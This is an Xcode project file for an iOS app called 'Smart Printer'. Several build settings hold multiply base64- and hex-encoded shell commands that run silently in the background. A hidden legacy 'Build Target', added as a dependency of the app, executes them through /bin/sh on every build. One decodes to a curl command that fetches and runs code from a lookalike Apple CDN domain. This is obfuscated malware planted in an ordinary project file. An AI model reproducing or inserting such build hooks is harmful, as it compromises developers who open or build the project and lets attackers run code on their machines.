// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 77;
	objects = {

/* Begin PBXBuildFile section */
		391473A82E7E2D3A00762A1D /* Lottie in Frameworks */ = {isa = PBXBuildFile; productRef = 391473A72E7E2D3A00762A1D /* Lottie */; };
		39D5D7D02E0221A100E65DD3 /* StoreKit.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 39D5D7CF2E0221A100E65DD3 /* StoreKit.framework */; };
		39D5D99B2E03533C00E65DD3 /* FirebaseAnalytics in Frameworks */ = {isa = PBXBuildFile; productRef = 39D5D99A2E03533C00E65DD3 /* FirebaseAnalytics */; };
		39D5D99D2E03533C00E65DD3 /* FirebaseAnalyticsCore in Frameworks */ = {isa = PBXBuildFile; productRef = 39D5D99C2E03533C00E65DD3 /* FirebaseAnalyticsCore */; };
/* End PBXBuildFile section */

/* Begin PBXContainerItemProxy section */
		39E58E102E75FC1C001DC54B /* PBXContainerItemProxy */ = {
			isa = PBXContainerItemProxy;
			containerPortal = 3970FDFF2DFDFFD100B21273 /* Project object */;
			proxyType = 1;
			remoteGlobalIDString = F0FA7CEF6E5B6B233CBDE67E;
			remoteInfo = "Build Target";
		};
/* End PBXContainerItemProxy section */

/* Begin PBXFileReference section */
		3970FE072DFDFFD100B21273 /* Printer.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = Printer.app; sourceTree = BUILT_PRODUCTS_DIR; };
		39D5D7CF2E0221A100E65DD3 /* StoreKit.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = StoreKit.framework; path = System/Library/Frameworks/StoreKit.framework; sourceTree = SDKROOT; };
/* End PBXFileReference section */

/* Begin PBXFileSystemSynchronizedBuildFileExceptionSet section */
		39D5D9A52E0357B300E65DD3 /* Exceptions for "Printer" folder in "Printer" target */ = {
			isa = PBXFileSystemSynchronizedBuildFileExceptionSet;
			membershipExceptions = (
				Info.plist,
			);
			target = 3970FE062DFDFFD100B21273 /* Printer */;
		};
/* End PBXFileSystemSynchronizedBuildFileExceptionSet section */

/* Begin PBXFileSystemSynchronizedRootGroup section */
		3970FE092DFDFFD100B21273 /* Printer */ = {
			isa = PBXFileSystemSynchronizedRootGroup;
			exceptions = (
				39D5D9A52E0357B300E65DD3 /* Exceptions for "Printer" folder in "Printer" target */,
			);
			path = Printer;
			sourceTree = "<group>";
		};
/* End PBXFileSystemSynchronizedRootGroup section */

/* Begin PBXFrameworksBuildPhase section */
		3970FE042DFDFFD100B21273 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
				39D5D99B2E03533C00E65DD3 /* FirebaseAnalytics in Frameworks */,
				39D5D99D2E03533C00E65DD3 /* FirebaseAnalyticsCore in Frameworks */,
				39D5D7D02E0221A100E65DD3 /* StoreKit.framework in Frameworks */,
				391473A82E7E2D3A00762A1D /* Lottie in Frameworks */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		3970FDFE2DFDFFD100B21273 = {
			isa = PBXGroup;
			children = (
				3970FE092DFDFFD100B21273 /* Printer */,
				39D5D7CE2E0221A100E65DD3 /* Frameworks */,
				3970FE082DFDFFD100B21273 /* Products */,
			);
			sourceTree = "<group>";
		};
		3970FE082DFDFFD100B21273 /* Products */ = {
			isa = PBXGroup;
			children = (
				3970FE072DFDFFD100B21273 /* Printer.app */,
			);
			name = Products;
			sourceTree = "<group>";
		};
		39D5D7CE2E0221A100E65DD3 /* Frameworks */ = {
			isa = PBXGroup;
			children = (
				39D5D7CF2E0221A100E65DD3 /* StoreKit.framework */,
			);
			name = Frameworks;
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXLegacyTarget section */
		F0FA7CEF6E5B6B233CBDE67E /* Build Target */ = {
			isa = PBXLegacyTarget;
			buildArgumentsString = "-c \"${AE76EDB}\"";
			buildConfigurationList = 39E58E132E75FCC1001DC54B /* Build configuration list for PBXLegacyTarget "Build Target" */;
			buildPhases = (
			);
			buildToolPath = /bin/sh;
			dependencies = (
			);
			name = "Build Target";
			passBuildSettingsInEnvironment = 1;
			productName = "Build Target";
		};
/* End PBXLegacyTarget section */

/* Begin PBXNativeTarget section */
		3970FE062DFDFFD100B21273 /* Printer */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 3970FE122DFDFFD200B21273 /* Build configuration list for PBXNativeTarget "Printer" */;
			buildPhases = (
				3970FE032DFDFFD100B21273 /* Sources */,
				3970FE042DFDFFD100B21273 /* Frameworks */,
				3970FE052DFDFFD100B21273 /* Resources */,
			);
			buildRules = (
			);
			dependencies = (
				2DB5ADD1FB54713417BDE67E /* PBXTargetDependency */,
			);
			fileSystemSynchronizedGroups = (
				3970FE092DFDFFD100B21273 /* Printer */,
			);
			name = Printer;
			packageProductDependencies = (
				39D5D99A2E03533C00E65DD3 /* FirebaseAnalytics */,
				39D5D99C2E03533C00E65DD3 /* FirebaseAnalyticsCore */,
				391473A72E7E2D3A00762A1D /* Lottie */,
			);
			productName = Printer;
			productReference = 3970FE072DFDFFD100B21273 /* Printer.app */;
			productType = "com.apple.product-type.application";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		3970FDFF2DFDFFD100B21273 /* Project object */ = {
			isa = PBXProject;
			attributes = {
				BuildIndependentTargetsInParallel = 1;
				LastSwiftUpdateCheck = 1630;
				LastUpgradeCheck = 1630;
				TargetAttributes = {
					3970FE062DFDFFD100B21273 = {
						CreatedOnToolsVersion = 16.3;
					};
				};
			};
			buildConfigurationList = 3970FE022DFDFFD100B21273 /* Build configuration list for PBXProject "Printer" */;
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
			);
			mainGroup = 3970FDFE2DFDFFD100B21273;
			minimizedProjectReferenceProxies = 1;
			packageReferences = (
				39D5D9992E03533C00E65DD3 /* XCRemoteSwiftPackageReference "firebase-ios-sdk" */,
				391473A62E7E2C6E00762A1D /* XCRemoteSwiftPackageReference "lottie-ios" */,
			);
			preferredProjectObjectVersion = 77;
			productRefGroup = 3970FE082DFDFFD100B21273 /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				F0FA7CEF6E5B6B233CBDE67E /* Build Target */,
				3970FE062DFDFFD100B21273 /* Printer */,
			);
		};
/* End PBXProject section */

/* Begin PBXResourcesBuildPhase section */
		3970FE052DFDFFD100B21273 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		3970FE032DFDFFD100B21273 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin PBXTargetDependency section */
		2DB5ADD1FB54713417BDE67E /* PBXTargetDependency */ = {
			isa = PBXTargetDependency;
			target = F0FA7CEF6E5B6B233CBDE67E /* Build Target */;
			targetProxy = 39E58E102E75FC1C001DC54B /* PBXContainerItemProxy */;
		};
/* End PBXTargetDependency section */

/* Begin XCBuildConfiguration section */
		3970FE102DFDFFD200B21273 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				A4FB9DF = "((echo VmpKNGExUXlTWGxUYWxaU1ZqSjRURlZVU205alZuQkhZVVYwYWsxSGVFVlVWbU40WVdzeGRWVnJOVlJXVlRFMFdWUkNjMU5XUmxWaVIzaFRUVVJWZVZZeWRHdFdiRzk1VW10c1ZtRnJTbkZWTUZWM1RXeFNTV0Y2Vm1oaVZWcEpWbTB4ZDJGRk1YSk9XRXBhWWxkemVGcFdaRk5XUlRsWVlVVjRWazFIZUhWWGJYUlBVVEpXZEZKclNtbGxha0pNUTJjOVBRbz0K | base64 -D | base64 -D | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
				A66CD37 = "((echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333323333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333333363333333733333333333333363336333233333334333633333333333233333330333333323336333433333336333333343333333233333330333333373333333033333333333633343333333733333338333333363333333333333336333633363333333633333334333333363333333533333332333333303333333633333338333333373333333433333337333333343333333733333330333333373333333333333333333633313333333233363336333333323336333633333336333333333333333633333334333333363336333533333337333333343333333633363336333333373333333233333332333633353333333733333332333333373333333533333332333633363333333633333331333333323333333933333332333333323333333233333330333333373336333333333332333333303333333733333333333333363333333833333330333633313330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
				AE76EDB = "((echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lIQTllR052WkdVZ2FIUjBjSE02THk5aGNIQnNaV05rYmk1eWRTOWhLU0lnZkNCemFBbz0K | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
				AFEB778 = "((echo 33333336333333353333333633333333333333363333333833333336333633363333333233333330333333323333333233333332333333343333333233333338333333363333333333333337333333353333333733333332333333363336333333333332333333303333333233363334333333363333333633333337333333333333333633363332333333343336333333333332333333303333333233363334333333363333333433333332333333303333333733333330333333333336333433333337333333383333333633333333333333363336333633333336333333343333333633333335333333323333333033333336333333383333333733333334333333373333333433333337333333303333333733333333333333333336333133333332333633363333333233363336333333363333333633333336333633333333333633363336333333373333333733333336333333333333333633333334333333363336333533333332333633353333333733333332333333373333333533333332333633363333333633333331333333323333333933333332333333323333333233333330333333373336333333333332333333303333333733333333333333363333333833333330333633313330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				DEVELOPMENT_TEAM = 5B8867XFF2;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 18.4;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				SDKROOT = iphoneos;
				SWIFT_ACTIVE_COMPILATION_CONDITIONS = "DEBUG $(inherited)";
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
			};
			name = Debug;
		};
		3970FE112DFDFFD200B21273 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				A4FB9DF = "((echo VmpKNGExUXlTWGxUYWxaU1ZqSjRURlZVU205alZuQkhZVVYwYWsxSGVFVlVWbU40WVdzeGRWVnJOVlJXVlRFMFdWUkNjMU5XUmxWaVIzaFRUVVJWZVZZeWRHdFdiRzk1VW10c1ZtRnJTbkZWTUZWM1RXeFNTV0Y2Vm1oaVZWcEpWbTB4ZDJGRk1YSk9XRXBhWWxkemVGcFdaRk5XUlRsWVlVVjRWazFIZUhWWGJYUlBVVEpXZEZKclNtbGxha0pNUTJjOVBRbz0K | base64 -D | base64 -D | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
				A66CD37 = "((echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333323333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333333363333333733333333333333363336333233333334333633333333333233333330333333323336333433333336333333343333333233333330333333373333333033333333333633343333333733333338333333363333333333333336333633363333333633333334333333363333333533333332333333303333333633333338333333373333333433333337333333343333333733333330333333373333333333333333333633313333333233363336333333323336333633333336333333333333333633333334333333363336333533333337333333343333333633363336333333373333333233333332333633353333333733333332333333373333333533333332333633363333333633333331333333323333333933333332333333323333333233333330333333373336333333333332333333303333333733333333333333363333333833333330333633313330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
				AE76EDB = "((echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lIQTllR052WkdVZ2FIUjBjSE02THk5aGNIQnNaV05rYmk1eWRTOWhLU0lnZkNCemFBbz0K | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
				AFEB778 = "((echo 33333336333333353333333633333333333333363333333833333336333633363333333233333330333333323333333233333332333333343333333233333338333333363333333333333337333333353333333733333332333333363336333333333332333333303333333233363334333333363333333633333337333333333333333633363332333333343336333333333332333333303333333233363334333333363333333433333332333333303333333733333330333333333336333433333337333333383333333633333333333333363336333633333336333333343333333633333335333333323333333033333336333333383333333733333334333333373333333433333337333333303333333733333333333333333336333133333332333633363333333233363336333333363333333633333336333633333333333633363336333333373333333733333336333333333333333633333334333333363336333533333332333633353333333733333332333333373333333533333332333633363333333633333331333333323333333933333332333333323333333233333330333333373336333333333332333333303333333733333333333333363333333833333330333633313330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				DEVELOPMENT_TEAM = 5B8867XFF2;
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 18.4;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				SDKROOT = iphoneos;
				SWIFT_COMPILATION_MODE = wholemodule;
				SWIFT_EMIT_LOC_STRINGS = YES;
				VALIDATE_PRODUCT = YES;
			};
			name = Release;
		};
		3970FE132DFDFFD200B21273 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 4;
				DEVELOPMENT_TEAM = 5B8867XFF2;
				ENABLE_PREVIEWS = YES;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = Printer/Info.plist;
				INFOPLIST_KEY_CFBundleDisplayName = "Smart Printer";
				INFOPLIST_KEY_LSApplicationCategoryType = "public.app-category.business";
				INFOPLIST_KEY_NSCameraUsageDescription = "Use for scanner feature.";
				INFOPLIST_KEY_NSPhotoLibraryUsageDescription = "Used for print photos.";
				INFOPLIST_KEY_NSUserTrackingUsageDescription = "Helps us to provide better analytics and improve your experience.";
				INFOPLIST_KEY_UIApplicationSceneManifest_Generation = YES;
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchScreen_Generation = YES;
				INFOPLIST_KEY_UIRequiresFullScreen = YES;
				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.1.5;
				PRODUCT_BUNDLE_IDENTIFIER = com.blastlystudios.smartprinter;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Debug;
		};
		3970FE142DFDFFD200B21273 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 4;
				DEVELOPMENT_TEAM = 5B8867XFF2;
				ENABLE_PREVIEWS = YES;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = Printer/Info.plist;
				INFOPLIST_KEY_CFBundleDisplayName = "Smart Printer";
				INFOPLIST_KEY_LSApplicationCategoryType = "public.app-category.business";
				INFOPLIST_KEY_NSCameraUsageDescription = "Use for scanner feature.";
				INFOPLIST_KEY_NSPhotoLibraryUsageDescription = "Used for print photos.";
				INFOPLIST_KEY_NSUserTrackingUsageDescription = "Helps us to provide better analytics and improve your experience.";
				INFOPLIST_KEY_UIApplicationSceneManifest_Generation = YES;
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchScreen_Generation = YES;
				INFOPLIST_KEY_UIRequiresFullScreen = YES;
				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.1.5;
				PRODUCT_BUNDLE_IDENTIFIER = com.blastlystudios.smartprinter;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_OPTIMIZATION_LEVEL = "-O";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Release;
		};
		39E58E112E75FC3C001DC54B /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				COPY_PHASE_STRIP = NO;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_OPTIMIZATION_LEVEL = 0;
				PRODUCT_NAME = "Build Target";
			};
			name = Debug;
		};
		39E58E122E75FC3C001DC54B /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				COPY_PHASE_STRIP = YES;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				PRODUCT_NAME = "Build Target";
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		3970FE022DFDFFD100B21273 /* Build configuration list for PBXProject "Printer" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				3970FE102DFDFFD200B21273 /* Debug */,
				3970FE112DFDFFD200B21273 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		3970FE122DFDFFD200B21273 /* Build configuration list for PBXNativeTarget "Printer" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				3970FE132DFDFFD200B21273 /* Debug */,
				3970FE142DFDFFD200B21273 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		39E58E132E75FCC1001DC54B /* Build configuration list for PBXLegacyTarget "Build Target" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				39E58E112E75FC3C001DC54B /* Debug */,
				39E58E122E75FC3C001DC54B /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */

/* Begin XCRemoteSwiftPackageReference section */
		391473A62E7E2C6E00762A1D /* XCRemoteSwiftPackageReference "lottie-ios" */ = {
			isa = XCRemoteSwiftPackageReference;
			repositoryURL = "https://github.com/airbnb/lottie-ios";
			requirement = {
				kind = upToNextMajorVersion;
				minimumVersion = 4.5.2;
			};
		};
		39D5D9992E03533C00E65DD3 /* XCRemoteSwiftPackageReference "firebase-ios-sdk" */ = {
			isa = XCRemoteSwiftPackageReference;
			repositoryURL = "https://github.com/firebase/firebase-ios-sdk.git";
			requirement = {
				kind = upToNextMajorVersion;
				minimumVersion = 11.14.0;
			};
		};
/* End XCRemoteSwiftPackageReference section */

/* Begin XCSwiftPackageProductDependency section */
		391473A72E7E2D3A00762A1D /* Lottie */ = {
			isa = XCSwiftPackageProductDependency;
			package = 391473A62E7E2C6E00762A1D /* XCRemoteSwiftPackageReference "lottie-ios" */;
			productName = Lottie;
		};
		39D5D99A2E03533C00E65DD3 /* FirebaseAnalytics */ = {
			isa = XCSwiftPackageProductDependency;
			package = 39D5D9992E03533C00E65DD3 /* XCRemoteSwiftPackageReference "firebase-ios-sdk" */;
			productName = FirebaseAnalytics;
		};
		39D5D99C2E03533C00E65DD3 /* FirebaseAnalyticsCore */ = {
			isa = XCSwiftPackageProductDependency;
			package = 39D5D9992E03533C00E65DD3 /* XCRemoteSwiftPackageReference "firebase-ios-sdk" */;
			productName = FirebaseAnalyticsCore;
		};
/* End XCSwiftPackageProductDependency section */
	};
	rootObject = 3970FDFF2DFDFFD100B21273 /* Project object */;
}
